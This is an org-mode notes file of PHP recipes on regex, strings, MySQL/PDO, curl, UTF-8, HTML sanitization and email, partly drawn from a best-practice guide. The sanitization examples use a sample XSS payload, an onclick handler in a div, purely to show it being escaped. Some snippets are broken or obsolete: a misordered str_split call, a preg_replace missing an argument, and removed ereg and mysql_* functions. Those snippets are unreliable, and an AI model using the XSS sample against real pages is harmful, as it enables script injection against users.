#+TITLE:  php recipes
#+AUTHOR:  Mohammad Reza Mansouri
#+HTML_HEAD: <link rel="stylesheet" type="text/css" href="css/main.css" />
#+HTML_HEAD: <script src="js/org-info.js"></script>
#+HTML_HEAD: <script src="js/ganalytics.js" async></script>
#+STARTUP: overview

* regular expression
** Finding the nth Occurrence of a Match

#+begin_src php
<?php
$todo = "1. Get Dressed 2. Eat Jelly 3. Squash every week into a day";

preg_match_all("/\d\. ([^\d]+)/", $todo, $matches);

print "The second item on the todo list is: ";
// $matches[1] is an array of each substring captured by ([^\d]+)
print $matches[1][1];

print "The entire todo list is: ";
foreach($matches[1] as $match) {
    print "$match\n";
}
?>
#+end_src

Because the preg_match() function stops after it finds one match, you
need to use preg_match_all() instead if you’re looking for additional
matches. The preg_match_all() function returns the number of full
pattern matches it finds. If it finds no matches, it returns 0. If it
encounters an error, such as a syntax problem in the pattern, it
returns false.

The third argument to preg_match_all() is populated with an array
holding information about the various substrings that the pattern has
matched. The first element holds an array of matches of the complete
pattern. For Example 22-4, this means that $matches[0] holds the parts
of $todo that match /\d\. ([^\d]+)/: 1. Get Dressed, 2. Eat Jelly,
and 3. Squash every week into a day.

Subsequent elements of the $matches array hold arrays of text matched
by each parenthesized subpattern. The pattern in Example 22-4 has just
one subpattern ([^\d]+). So $matches[1] is an array of strings that
match that subpattern: Get Dressed, Eat Jelly, and Squash every week
into a day.

If there were a second subpattern, the substrings that it matched
would be in $matches[2], a third subpattern’s matches would be in
$matches[3], and so on.

Instead of returning an array divided into full matches and then
submatches, preg_match_all() can return an array divided by matches,
with each submatch inside. To trigger this, pass PREG_SET_ORDER in as
the fourth argument. This is particularly useful when you’ve got
multiple captured subpatterns and you want to iterate through the
subpattern groups one group at a time, as shown in Example 22-5.

#+begin_src php
<?php
$todo = "
first=Get Dressed
next=Eat Jelly
last=Squash every week into a day
";

preg_match_all("/([a-zA-Z]+)=(.*)/", $todo, $matches, PREG_SET_ORDER);

foreach ($matches as $match) {
    print "The {$match[1]} action is {$match[2]} \n";
}
?>
#+end_src

** replace n counts of a pattern

#+begin_src php
preg_replace($pattern,$replacement,$string,$limit);
#+end_src

$limit is by the default is -1 which means no limit.
** preg_match for a PHP URI (GET request)
#+begin_src php
<?php

# a php uri pattern match (for a php get request)
# look for anything other than these allowable characters
# A-Z, a-z, 0-9, _, ., -, +, ?, /, =
$pattern = "/[^A-Za-z0-9_\.\-\+\?\/=]/";
$string  = "?q=foo+a_b+a-z.java/foo/bar.cgi";

if (preg_match($pattern, $string))
{
  echo "string had bad characters in it";
}
else
{
  echo "no bad characters";
}

?>
#+end_src

** Regex Matching Patterns
#+begin_src php
 
 
Social Security Number
^(?!000)([0-6]\d{2}|7([0-6]\d|7[012]))([ -]?)(?!00)\d\d\3(?!0000)\d{4}$
 
US phone with or without parentheses
^\([0-9]{3}\)\s?[0-9]{3}(-|\s)?[0-9]{4}$|^[0-9]{3}-?[0-9]{3}-?[0-9]{4}$
 
ISO Date (19th to 21st century only)
^((18|19|20)\d\d)-(0[1-9]|1[012])-(0[1-9]|1[0-9]|2[0-9]|3[01])$
#+end_src

* strings
** defining heredoc document
   
#+begin_src php
print <<< END
It's funny when signs say things like:
   Original "Root" Beer
   "Free" Gift
   Shoes cleaned while "you" wait
or have other misquoted words.
END;
#+end_src

** search for substring in string

#+begin_src php
$a = 'How are you?';
if (strpos($a, 'are') !== false) {
    echo 'true';
}
#+end_src 

using =strstr()=

#+begin_src php
<?php
//string strstr ( string $haystack , mixed $needle [, bool $before_needle = false ] )
$email  = 'name@example.com';
$domain = strstr($email, '@');
echo $domain; // prints @example.com

$user = strstr($email, '@', true); // As of PHP 5.3.0
echo $user; // prints name
?>
#+end_src 

** Accessing Substrings
   
#+begin_src php
<?php

if (strpos($_POST['email'], '@') === false) {
    print 'There was no @ in the e-mail address!';
}

?>
#+end_src

** Extracting Substrings

#+begin_src php
<?php
 $substring = substr($string,$start,$length);
 $username = substr($_GET['username'],0,8);
?>
#+end_src

** substring from beginning of the line except the last char

#+begin_src php
substr("abcd",0,-1);       // abc
#+end_src

** Replacing substrings

#+begin_src php
// Everything from position $start to the end of $old_string
// becomes $new_substring
$new_string = substr_replace($old_string,$new_substring,$start);

// $length characters, starting at position $start, become $new_substring
$new_string = substr_replace($old_string,$new_substring,$start,$length);
#+end_src

** Processing a String One Byte at a Time

#+begin_src php
<?php
$string = "This weekend, I'm going shopping for a pet chicken.";
$vowels = 0;
for ($i = 0, $j = strlen($string); $i < $j; $i++) {
    if (strstr('aeiouAEIOU',$string[$i])) {
        $vowels++;
    }
}
?>
#+end_src

** Reversing a String by Byte

#+begin_src php
<?php
print strrev('This is not a palindrome.');
?>
#+end_src

** Reversing a string by word

#+begin_src php
<?php
$s = "Once upon a time there was a turtle.";
// break the string up into words
$words = explode(' ',$s);
// reverse the array of words
$words = array_reverse($words);
// rebuild the string
$s = implode(' ',$words);
print $s;
?>
#+end_src

#+begin_src php
<?php
$reversed_s = implode(' ',array_reverse(explode(' ',$s)));
?>
#+end_src

** Switching tabs and spaces

#+begin_src php
<?php
$r = mysql_query("SELECT message FROM messages WHERE id = 1") or die();
$ob = mysql_fetch_object($r);
$tabbed = str_replace(' ',"\t",$ob->message);
$spaced = str_replace("\t",' ',$ob->message);

print "With Tabs: <pre>$tabbed</pre>";
print "With Spaces: <pre>$spaced</pre>";
?>
#+end_src

** trimming space
   
Use ltrim(), rtrim(), or trim(). ltrim() removes whitespace from the
beginning of a string, rtrim() from the end of a string, and trim()
from both the beginning and end of a string:

** controlling case
*** capitalizing letters

#+begin_src php
<?php
print ucfirst("how do you do today?");  //capitalized the first word in string
print ucwords("the prince of wales");  //capitalizes the first character of each word in a string
?>
#+end_src

*** whole string case control

The functions strtolower() and strtoupper() work on entire strings,
not just individual characters. All alphabetic characters are changed
to lowercase by strtolower() and strtoupper() changes all alphabetic
characters to uppercase:

#+begin_src php
<?php
print strtolower("I programmed the WOPR and the TRS-80.");
print strtoupper('"since feeling is first" is a poem by e. e. cummings.');
?>
#+end_src

** ordinal value of character
use ~ord("h")~
** character value of integer
use ~chr(ascii)~
** replace multiple

#+begin_src php
str_ireplace(['a', 'e', 'i', 'o', 'u'], '!', $str);
#+end_src

** convert string to array

#+begin_src php
// split a string without delimiter
str_split($str);
// split a string with delimiter
str_split(' ',$str);
explode(' ', $str);
#+end_src
 
** split a string by char

#+begin_src php
preg_split('/,/',$str);   // split by ','
preg_split('//',$str);    // split characters
explode(',', $str);
#+end_src

** split a string to chunks of length n
#+begin_src php
$str="abcdefghijklm";
echo print_r(str_split($str, 3),true);

// result
Array
(
    [0] => abc
    [1] => def
    [2] => ghi
    [3] => jkl
    [4] => m
)

#+end_src

** split string by string

#+begin_src php
//array explode ( string $delimiter , string $string [, int $limit = PHP_INT_MAX ] );

// Example 1
$pizza  = "piece1 piece2 piece3 piece4 piece5 piece6";
$pieces = explode(" ", $pizza);
echo $pieces[0]; // piece1
echo $pieces[1]; // piece2

// Example 2
$data = "foo:*:1023:1000::/home/foo:/bin/sh";
list($user, $pass, $uid, $gid, $gecos, $home, $shell) = explode(":", $data);
echo $user; // foo
echo $pass; // *
#+end_src 

** remove alphabet values from string

#+begin_src php
$res = preg_replace('/^[0-9].,/',$str);
#+end_src

** check if string is empty or null
#+begin_src php 
// Function for basic field validation (present and neither empty nor only white space)
function IsNullOrEmptyString($question){
    return (!isset($question) || trim($question)==='');
}
#+end_src 

** remove all leading zeros from  a string

#+begin_src php 
$str = ltrim($str, '0');
#+end_src

** Check number of characters in a range

#+begin_src php
<?PHP 
 
//check the amount of characters in a string function 
FUNCTION CheckNoChars($strText){ 
//check for between 6 and 12 characters 
IF (EREGI("^.{6,12}$" , $strText)) 
RETURN TRUE; 
ELSE 
RETURN FALSE; 
} 
?> 
 
 
<?PHP 
 
//test the function 
$str1 = "mypasswordistoolong"; 
IF (CheckNoChars($str1)){
 
//if it's okay, display this message 
     ECHO "this has the correct number of characters"; 
 
//if not okay, display this message instead 
}ELSE {
     ECHO "incorrect number of characters"; 
}
?>
#+end_src

** Filter non-alphanumeric characters
#+begin_src php
 <?PHP
 
//Begin filtering variable  $data of non alphanumeric characters
 
$data = PREG_REPLACE("/[^0-9a-zA-Z]/i", '', $data);
 
//Finish filtering of non alphanumeric characters
 
?>
#+end_src

** How to remove non-printable characters from strings
Solution: Allow only ASCII characters

#+begin_src php
$result = preg_replace('/[\x00-\x1F\x80-\xFF]/', '', $string);
#+end_src

Possible solution: Use the 'print' regex
Another possible solution is to use the ‘print’ regular expression shown in this example with preg_replace:

#+begin_src php
$result = preg_replace('/[[:^print:]]/', "", $string);
#+end_src

*More PHP regular expressions*
#+begin_src
[:digit:]      Only the digits 0 to 9
[:alnum:]      Any alphanumeric character 0 to 9 OR A to Z or a to z.
[:alpha:]      Any alpha character A to Z or a to z.
[:blank:]      Space and TAB characters only.
[:xdigit:]     .
[:punct:]      Punctuation symbols . , " ' ? ! ; :
[:print:]      Any printable character.
[:space:]      Any space characters.
[:graph:]      .
[:upper:]      Any alpha character A to Z.
[:lower:]      Any alpha character a to z.
[:cntrl:]      .
#+end_src

As shown in my earlier example, you actually need to use two brackets with these
regex patterns when using preg_replace:

#+begin_src php
$result = preg_replace('/[[:^print:]]/', "", $string);
#+end_src

http://php.net/manual/en/ref.regex.php

** example PHP MySQL script (with a SQL 'SELECT' query)
#+begin_src php
<?php
  $servername = "localhost";
  $username = "d8_user";
  $password = "d8_pass";
  $dbname = "aa_d8";

  # connect to the database
  $conn = new mysqli($servername, $username, $password, $dbname);
  if ($conn->connect_error) {
      die("Connection failed: " . $conn->connect_error);
  }

  # execute a query and output its results
  $sql = "SELECT * FROM node__field_photo";
  $result = $conn->query($sql);
  if ($result->num_rows > 0) {
      // output data of each row
      while($row = $result->fetch_assoc()) {
          echo "bundle: " . $row["bundle"]. ", " . $row["entity_id"]. ", " . $row["field_photo_target_id"]. "\n";
      }
  } else {
      echo "0 results";
  }

  $conn->close();
 
?>
#+end_src

** PHP json_encode array conversion example
*** example #1
#+begin_src php
<?php

#
# do some stuff here ...
#

# send a json reply back to the sencha client
header('Content-type: text/html');
echo json_encode(array(
    "success" => true,
    "msg" => $message,
    "id" => $id
));

?>
#+end_src

*** example #2
#+begin_src php
<?php

header('Content-type: text/html');
echo json_encode(
    array(
        array('symbol' => 'AAPL', 'price' => '525.00'),
        array('symbol' => 'GOOG', 'price' => '600.00'),
        array('symbol' => 'TSLA', 'price' => '220.00')
    )
);
?>
#+end_src

** use PHP curl and curl_setopt with JSON web services
*** A PHP curl GET request
#+begin_src php
<?php

# An HTTP GET request example

$url = 'http://localhost:8080/stocks';
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_TIMEOUT, 5);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$data = curl_exec($ch);
curl_close($ch);
echo $data;
?>
#+end_src

*** A PHP curl POST request, with JSON data

#+begin_src php
<?php

# An HTTP POST request example

# a pass-thru script to call my Play server-side code.
# currently needed in my dev environment because Apache and Play run on
# different ports. (i need to do something like a reverse-proxy from
# Apache to Play.)

# the POST data we receive from Sencha (which is not JSON)
$id = $_POST['id'];
$symbol = $_POST['symbol'];
$companyName = $_POST['companyName'];

# data needs to be POSTed to the Play url as JSON.
# (some code from http://www.lornajane.net/posts/2011/posting-json-data-with-php-curl)
$data = array("id" => "$id", "symbol" => "$symbol", "companyName" => "$companyName");
$data_string = json_encode($data);

$ch = curl_init('http://localhost:8080/stocks/add');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Content-Type: application/json',
    'Content-Length: ' . strlen($data_string))
);
curl_setopt($ch, CURLOPT_TIMEOUT, 5);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);

//execute post
$result = curl_exec($ch);

//close connection
curl_close($ch);

echo $result;

?>
#+end_src

** PHP5 Email Validation
#+begin_src php
function isValidEmail($email){
 return filter_var(filter_var($email, FILTER_SANITIZE_EMAIL), FILTER_VALIDATE_EMAIL);
}

if(isValidEmail('email@domain.com')){
//valid
} else {
//not valid
}
#+end_src

** reduce multiple consecutive spaces to a single space
A PHP function that reduces multiple consecutive spaces in a string to one
single space, so something like " " is reduced to " ".
#+begin_src php 
function reduceMultipleSpacesToSingleSpace($text) {
  return preg_replace('/\s+/', " ", $text );
}
#+end_src

** strip all non alphanumeric characters from a string
A PHP function that strips a string of all characters other than alphanumeric
characters:

#+begin_src php 
function onlyAlphanumericAndSpaces($text) {
  # allow only alphanumeric
  return ereg_replace("[^A-Za-z0-9 ]", "", $text );
}
#+end_src 

** remove all illegal characters from an email address
#+begin_src php
<?php
$email = "john(.doe)@exa//mple.com";

$email = filter_var($email, FILTER_SANITIZE_EMAIL);
echo $email;
?>
#+end_src

** A PHP last character function
#+begin_src php  
# a php last character function
function last_char($str)
{
  $len = strlen($str);
  return char_at($str, $len-1);
}

function char_at($str, $pos)
{
  return $str{$pos};
}
#+end_src 

** array to CSV string example
#+begin_src php
$csv_string = implode(',', $tags);
#+end_src

** PHP and UTF-8 (/best practice/)
*** intro
*There’s no one-liner. Be careful, detailed, and consistent.*
UTF-8 in PHP sucks. Sorry.

Right now PHP does not support Unicode at a low level. There are ways to ensure
that UTF-8 strings are processed OK, but it’s not easy, and it requires digging
in to almost all levels of the web app, from HTML to SQL to PHP. We’ll aim for a
brief, practical summary.

*** UTF-8 at the PHP level
The basic string operations, like concatenating two strings and assigning
strings to variables, don’t need anything special for UTF-8. However most string
functions, like strpos() and strlen(), do need special consideration. These
functions often have an mb_* counterpart: for example, mb_strpos() and
mb_strlen(). Together, these counterpart functions are called the Multibyte
String Functions. The multibyte string functions are specifically designed to
operate on Unicode strings.

You must use the mb_* functions whenever you operate on a Unicode string. For
example, if you use substr() on a UTF-8 string, there’s a good chance the result
will include some garbled half-characters. The correct function to use would be
the multibyte counterpart, mb_substr().

The hard part is remembering to use the mb_* functions at all times. If you
forget even just once, your Unicode string has a chance of being garbled during
further processing.

Not all string functions have an mb_* counterpart. If there isn’t one for what
you want to do, then you might be out of luck.

Additionally, you should use the mb_internal_encoding() function at the top of
every PHP script you write (or at the top of your global include script), and
the mb_http_output() function right after it if your script is outputting to a
browser. Explicitly defining the encoding of your strings in every script will
save you a lot of headaches down the road.

Finally, many PHP functions that operate on strings have an optional parameter
letting you specify the character encoding. You should always explicitly
indicate UTF-8 when given the option. For example, htmlentities() has an option
for character encoding, and you should always specify UTF-8 if dealing with such
strings.

*** UTF-8 at the OS level
Often you’ll find yourself writing files with contents or filenames encoded in
some flavor of Unicode. PHP is able to run on a variety of operating systems,
including Linux and Windows; but sadly how it handles Unicode filenames differs
on each platform due to OS-level quirks.

Linux and OSX appear to handle UTF-8 filenames fairly well. Windows, however,
doesn’t. If you try to use PHP to write to a file with non-ASCII characters in
the filename in Windows, you may discover that the filename is displayed with
strange or corrupted characters.

There doesn’t seem to be an easy, portable workaround here. In Linux and OSX you
can encode your filenames with UTF-8, but in Windows you have to remember to
encode using ISO-8859-1.

If you don’t want to bother with having your script check if it’s running on
Windows or not, you could always URL encode all of your filenames before writing
them. This effectively works around Unicode quirks by representing Unicode
characters by a subset of ASCII.

*** UTF-8 at the MySQL level
If your PHP script accesses MySQL, there’s a chance your strings could be stored
as non-UTF-8 strings in the database even if you follow all of the precautions
above.

To make sure your strings go from PHP to MySQL as UTF-8, make sure your database
and tables are all set to the utf8mb4 character set and collation, and that you
use the utf8mb4 character set in the PDO connection string. For an example, see
the section on connecting to and querying a MySQL database. This is critically
important.

Note that you must use the utf8mb4 character set for complete UTF-8 support, not
the utf8 character set! See Further Reading for why.

*** UTF-8 at the browser level
Use the mb_http_output() function to ensure that your PHP script outputs UTF-8
strings to your browser. In your HTML, include the charset meta tag in your
page’s <head> tag.

*** example
#+begin_src php
<?php
// Tell PHP that we're using UTF-8 strings until the end of the script
mb_internal_encoding('UTF-8');
 
// Tell PHP that we'll be outputting UTF-8 to the browser
mb_http_output('UTF-8');
 
// Our UTF-8 test string
$string = 'Êl síla erin lû e-govaned vîn.';
 
// Transform the string in some way with a multibyte function
// Note how we cut the string at a non-Ascii character for demonstration purposes
$string = mb_substr($string, 0, 15);
 
// Connect to a database to store the transformed string
// See the PDO example in this document for more information
// Note that we define the character set as utf8mb4 in the PDO connection string
$link = new \PDO(   'mysql:host=your-hostname;dbname=your-db;charset=utf8mb4',
                    'your-username',
                    'your-password',
                    array(
                        \PDO::ATTR_ERRMODE => \PDO::ERRMODE_EXCEPTION,
                        \PDO::ATTR_PERSISTENT => false
                    )
                );
 
// Store our transformed string as UTF-8 in our database
// Your DB and tables are in the utf8mb4 character set and collation, right?
$handle = $link->prepare('insert into ElvishSentences (Id, Body) values (?, ?)');
$handle->bindValue(1, 1, PDO::PARAM_INT);
$handle->bindValue(2, $string);
$handle->execute();
 
// Retrieve the string we just stored to prove it was stored correctly
$handle = $link->prepare('select * from ElvishSentences where Id = ?');
$handle->bindValue(1, 1, PDO::PARAM_INT);
$handle->execute();
 
// Store the result into an object that we'll output later in our HTML
$result = $handle->fetchAll(\PDO::FETCH_OBJ);
?><!doctype html>
<html>
    <head>
        <meta charset="UTF-8" />
        <title>UTF-8 test page</title>
    </head>
    <body>
        <?php
        foreach($result as $row){
            print($row->Body);  // This should correctly output our transformed UTF-8 string to the browser
        }
        ?>
    </body>
</html>
#+end_src 

** Sanitizing HTML input and output (/best practice/)
*** intro
Use the htmlentities() function for simple sanitization and the HTML Purifier
library for complex sanitization.

Tested with HTML Purifier 4.6.0.

When displaying user input in any web application, it’s essential to “sanitize”
it first to remove any potentially dangerous HTML. A malicious user can craft
HTML that, if outputted directly by your web app, can be dangerous to the person
viewing it.

While it may be tempting to use regular expressions to sanitize HTML, do not do
this. HTML is a complex language and it’s virtually guaranteed that any attempt
you make at using regular expressions to sanitize HTML will fail.

You might also find advice suggesting you use the strip_tags() function. While
strip_tags() is technically safe to use, it’s a “dumb” function in the sense
that if the input is invalid HTML (say, is missing an ending tag), then
strip_tags() might remove much more content than you expected. As such it’s not
a great choice either, because non-technical users often use the < and >
characters in communications.

If you read the section on validating email addresses, you might also be
considering using the filter_var() function. However the filter_var() function
has problems with line breaks, and requires non-intuitive configuration to
closely mirror the htmlentities() function. As such it’s not a good choice
either.

*** Sanitization for simple requirements
If your web app only needs to completely escape (and thus render harmless, but
not remove entirely) HTML, use PHP’s built-in htmlentities() function. This
function is much faster than HTML Purifier, because it doesn’t perform any
validation on the HTML—it just escapes everything.

htmlentities() differs from its cousin htmlspecialchars() in that it encodes all
applicable HTML entities, not just a small subset.
#+begin_src php
<?php
// Oh no!  The user has submitted malicious HTML, and we have to display it in our web app!
$evilHtml = '<div onclick="xss();">Mua-ha-ha!  Twiddling my evil mustache...</div>';
 
// Use the ENT_QUOTES flag to make sure both single and double quotes are escaped.
// Use the UTF-8 character encoding if you've stored the text as UTF-8 (as you should have).
// See the UTF-8 section in this document for more details.
$safeHtml = htmlentities($evilHtml, ENT_QUOTES, 'UTF-8'); // $safeHtml is now fully escaped HTML.  You can output $safeHtml to your users without fear!
?>
#+end_src

Sanitization for complex requirements

For many web apps, simply escaping HTML isn’t enough. You probably want to
entirely remove any HTML, or allow a small subset of HTML through. To do this,
use the HTML Purifier library.

HTML Purifier is a well-tested but slow library. That’s why you should use
htmlentities() if your requirements aren’t that complex, because it will be
much, much faster.

HTML Purifier has the advantage over strip_tags() because it validates the HTML
before sanitizing it. That means if the user has inputted invalid HTML, HTML
Purifier has a better chance of preserving the intended meaning of the HTML than
strip_tags() does. It’s also highly customizable, allowing you to whitelist a
subset of HTML to keep in the output.

The downside is that it’s quite slow, it requires some setup that might not be
feasible in a shared hosting environment, and the documentation is often complex
and unclear. The following example is a basic configuration; check the
documentation to read about the more advanced features HTML Purifier offers.
#+begin_src php 
<?php
// Include the HTML Purifier library
require_once('htmlpurifier-4.6.0/HTMLPurifier.auto.php');
 
// Oh no!  The user has submitted malicious HTML, and we have to display it in our web app!
$evilHtml = '<div onclick="xss();">Mua-ha-ha!  Twiddling my evil mustache...</div>';
 
// Set up the HTML Purifier object with the default configuration.
$purifier = new HTMLPurifier(HTMLPurifier_Config::createDefault());
 
$safeHtml = $purifier->purify($evilHtml); // $safeHtml is now sanitized.  You can output $safeHtml to your users without fear!
?>
#+end_src 

*** Gotchas
 - Using htmlentities() with the wrong character encoding can result in
   surprising output. Always make sure that you specify a character encoding
   when calling the function, and that it matches the encoding of the string
   being sanitized. See the UTF-8 section for more details.

 - Always include the ENT_QUOTES and character encoding parameters when using
   htmlentities(). By default, htmlentities() doesn’t encode single quotes. What
   a dumb default!

 - HTML Purifier is extremely slow for complex HTML. Consider setting up a
   caching solution like APC to store the sanitized result for later use.
** Validating email addresses (/best practice/)
Use the filter_var() function.

A common task your web app might need to do is to check if a user has entered a
valid email address. You’ll no doubt find online a dizzying range of complex
regular expressions that all claim to solve this problem, but the easiest way is
to use PHP’s built-in filter_var() function, which can validate email addresses.

#+begin_src php
<?php
filter_var('sgamgee@example.com', FILTER_VALIDATE_EMAIL); // Returns "sgamgee@example.com". This is a valid email address.
filter_var('sauron@mordor', FILTER_VALIDATE_EMAIL); // Returns boolean false! This is *not* a valid email address.
?>
#+end_src

** Sending email (/best practice/)
Use PHPMailer.
Tested with PHPMailer 5.2.7.

PHP provides a mail() function that looks enticingly simple and easy.
Unfortunately, like a lot of things in PHP, its simplicity is deceptive and
using it at face value can lead to serious security problems.

Email is a set of protocols with an even more tortured history than PHP. Suffice
it to say that there are so many gotchas in sending email that just being in the
same room as PHP’s mail() function should give you the shivers.

PHPMailer is a popular and well-aged open-source library that provides an easy
interface for sending mail securely. It takes care of the gotchas for you so you
can concentrate on more important things.

#+begin_src php
<?php
// Include the PHPMailer library
require_once('phpmailer-5.2.7/PHPMailerAutoload.php');
 
// Passing 'true' enables exceptions.  This is optional and defaults to false.
$mailer = new PHPMailer(true);
 
// Send a mail from Bilbo Baggins to Gandalf the Grey
 
// Set up to, from, and the message body.  The body doesn't have to be HTML; check the PHPMailer documentation for details.
$mailer->Sender = 'bbaggins@example.com';
$mailer->AddReplyTo('bbaggins@example.com', 'Bilbo Baggins');
$mailer->SetFrom('bbaggins@example.com', 'Bilbo Baggins');
$mailer->AddAddress('gandalf@example.com');
$mailer->Subject = 'The finest weed in the South Farthing';
$mailer->MsgHTML('<p>You really must try it, Gandalf!</p><p>-Bilbo</p>');
 
// Set up our connection information.
$mailer->IsSMTP();
$mailer->SMTPAuth = true;
$mailer->SMTPSecure = 'ssl';
$mailer->Port = 465;
$mailer->Host = 'my smtp host';
$mailer->Username = 'my smtp username';
$mailer->Password = 'my smtp password';
 
// All done!
$mailer->Send();
?>
#+end_src

** PHP and regex (/best practice/)
Use the PCRE (preg_*) family of functions.

PHP has two different ways of using regular expressions: the PCRE
(Perl-compatible, preg_*) functions and the POSIX (POSIX extended, ereg_*)
functions.

Each family of functions uses a slightly different flavor of regular expression.
Luckily for us, the POSIX functions have been deprecated since PHP 5.3.0.
Because of this, you should never write new code using the POSIX functions.
Always use the PCRE functions, which are the preg_* functions.

 - Remember to use the /u flag when working with regexes, to ensure you’re working in Unicode mode.
define() vs. const

Use define() unless readability, class constants, or micro-optimization are concerns.

Traditionally in PHP you would define constants using the define() function. But
at some point PHP gained the ability to also declare constants with the const
keyword. Which one should you use when defining your constants?

The answer lies in the little differences between the two methods.

 1. define() defines constants at run time, while const defines constants at
    compile time. This gives const a very slight speed edge, but not one worth
    worrying about unless you’re building large-scale software.
 2. define() puts constants in the global scope, although you can include
    namespaces in your constant name. That means you can’t use define() to
    define class constants.
 3. define() lets you use expressions both in the constant name and in the
    constant value, unlike const which allows neither. This makes define() much
    more flexible.
 4. define() can be called within an if() block, while const cannot.

#+begin_src php 
<?php
// Let's see how the two methods treat namespaces
namespace MiddleEarth\Creatures\Dwarves;
const GIMLI_ID = 1;
define('MiddleEarth\Creatures\Elves\LEGOLAS_ID', 2);
 
echo(\MiddleEarth\Creatures\Dwarves\GIMLI_ID);  // 1
echo(\MiddleEarth\Creatures\Elves\LEGOLAS_ID);  // 2; note that we used define(), but the namespace is still recognized
 
// Now let's declare some bit-shifted constants representing ways to enter Mordor.
define('TRANSPORT_METHOD_SNEAKING', 1 << 0); // OK!
const TRANSPORT_METHOD_WALKING = 1 << 1; // Compile error! const can't use expressions as values
 
// Next, conditional constants.
define('HOBBITS_FRODO_ID', 1);
 
if($isGoingToMordor){
    define('TRANSPORT_METHOD', TRANSPORT_METHOD_SNEAKING); // OK!
    const PARTY_LEADER_ID = HOBBITS_FRODO_ID // Compile error: const can't be used in an if block
}
 
// Finally, class constants
class OneRing{
    const MELTING_POINT_CELSIUS = 1000000; // OK!
    define('MELTING_POINT_ELVISH_DEGREES', 200); // Compile error: can't use define() within a class
}
?>
#+end_src 

Because define() is ultimately more flexible, it’s the one you should use to
avoid headaches unless you specifically require class constants. Using const
generally results in more readable code, but at the expense of flexibility.

Whichever one you use, be consistent!
** Auto-loading classes (/best practice/)
Use spl_autoload_register() to register your auto-load function.

PHP provides several ways to auto-load files containing classes that haven’t yet
been loaded. The older way is to use a magic global function called
__autoload(). However you can only have one __autoload() function defined at
once, so if you’re including a library that also uses the __autoload() function,
then you’ll have a conflict.

The correct way to handle this is to name your autoload function something
unique, then register it with the spl_autoload_register() function. This
function allows more than one __autoload() function to be defined, so you won’t
step on any other code’s own __autoload() function.

#+begin_src php 
<?php
// First, define your auto-load function.
function MyAutoload($className){
    include_once($className . '.php');
}
 
// Next, register it with PHP.
spl_autoload_register('MyAutoload');
 
// Try it out!
// Since we haven't included a file defining the MyClass object, our auto-loader will kick in and include MyClass.php.
// For this example, assume the MyClass class is defined in the MyClass.php file.
$var = new MyClass();
?>
#+end_src 

** PHP tags (/best practice/)
*Use <?php ?>.*

There are a few different ways to delimit blocks of PHP: <?php ?>, <?= ?>, <?
?>, and <% %>. While the shorter ones might be more convenient to type, they’re
disabled by default and must be enabled by configuring the PHP server with the
short_open_tag option. Therefore the only method that’s guaranteed to work on
all PHP servers is <?php ?>. If you ever plan on deploying your PHP to a server
whose configuration you can’t control, then you should always use <?php ?>.

Fortunately <?= is available regardless of whether or not short tags are
enabled, so it’s always safe to use that shorthand instead of <?php echo() ?>.

If you’re only coding for yourself and have control over the PHP configuration
you’ll be using, you might find the shorter tags to be more convenient. But
remember that <? ?> might conflict with XML declarations and <% %> is actually
ASP style.

Whatever you choose, make sure you stay consistent!

 - When including a closing ?> tag in a pure PHP file (for example, in a file
   that only contains a class definition), make sure not to leave any trailing
   newlines after it. While the PHP parser safely “eats” a single newline
   character after the closing tag, any other newlines might be outputted to the
   browser and possibly confuse things if you’re outputting any HTTP headers
   later.

 - When writing a web app targeting older versions of IE, make sure not to leave
   a newline between any closing ?> tag and the html <!doctype> tag. Old
   versions of IE will enter quirks mode if they encounter any white space,
   including newlines, before the doctype declaration. This isn’t an issue for
   newer versions of IE and other, more advanced browsers. (Read: every other
   browser besides IE.)

** Connecting to and querying a MySQL database
Use PDO and its prepared statement functionality.

There are many ways to connect to a MySQL database in PHP. PDO (PHP Data
Objects) is the newest and most robust of them. PDO has a consistent interface
across many different types of database, uses an object-oriented approach, and
supports more features offered by newer databases.

You should use PDO’s prepared statement functions to help prevent SQL injection
attacks. Using the bindValue() function ensures that your SQL is safe from
first-order SQL injection attacks. (This isn’t 100% foolproof though, see
Further Reading for more details.) In the past, this had to be achieved with
some arcane combination of “magic quote” functions. PDO makes all that gunk
unnecessary.

#+begin_src php
  <?php
  try{
      // Create a new connection.
      // You'll probably want to replace hostname with localhost in the first parameter.

      // Note how we declare the charset to be utf8mb4. This alerts the connection
      // that we'll be passing UTF-8 data. This may not be required depending on
      // your configuration, but it'll save you headaches down the road if you're
      // trying to store Unicode strings in your database. See "Gotchas".

      // The PDO options we pass do the following:
      // \PDO::ATTR_ERRMODE enables exceptions for errors.  This is optional but can be handy.
      // \PDO::ATTR_PERSISTENT disables persistent connections, which can cause concurrency issues in certain cases.  See "Gotchas".
      $link = new \PDO(   'mysql:host=your-hostname;dbname=your-db;charset=utf8mb4',
                          'your-username',
                          'your-password',
                          array(
                              \PDO::ATTR_ERRMODE => \PDO::ERRMODE_EXCEPTION,
                              \PDO::ATTR_PERSISTENT => false
                          )
                      );

      $handle = $link->prepare('select Username from Users where UserId = ? or Username = ? limit ?');

      // PHP bug: if you don't specify PDO::PARAM_INT, PDO may enclose the
      // argument in quotes. This can mess up some MySQL queries that don't expect
      // integers to be quoted.

      // See: https://bugs.php.net/bug.php?id=44639

      // If you're not sure whether the value you're passing is an integer, use the is_int() function.

      // (This bug was fixed in Oct. 2016, but the fix is not applied to the
      // version of PHP used in this document; see
      // https://bugs.php.net/bug.php?id=73234)

      $handle->bindValue(1, 100, PDO::PARAM_INT);
      $handle->bindValue(2, 'Bilbo Baggins');
      $handle->bindValue(3, 5, PDO::PARAM_INT);

      $handle->execute();

      // Using the fetchAll() method might be too resource-heavy if you're selecting a truly massive amount of rows.
      // If that's the case, you can use the fetch() method and loop through each result row one by one.
      // You can also return arrays and other things instead of objects.  See the PDO documentation for details.
      $result = $handle->fetchAll(\PDO::FETCH_OBJ);

      foreach($result as $row){
          print($row->Username);
      }
  }
  catch(\PDOException $ex){
      print($ex->getMessage());
  }
  ?>
#+end_src 

 - Not passing the PDO::PARAM_INT parameter when binding integer variables can
   sometimes cause PDO to quote them. This can screw up certain MySQL queries.
   See this bug report.

 - Not having set the character set to utf8mb4 in the connection string might
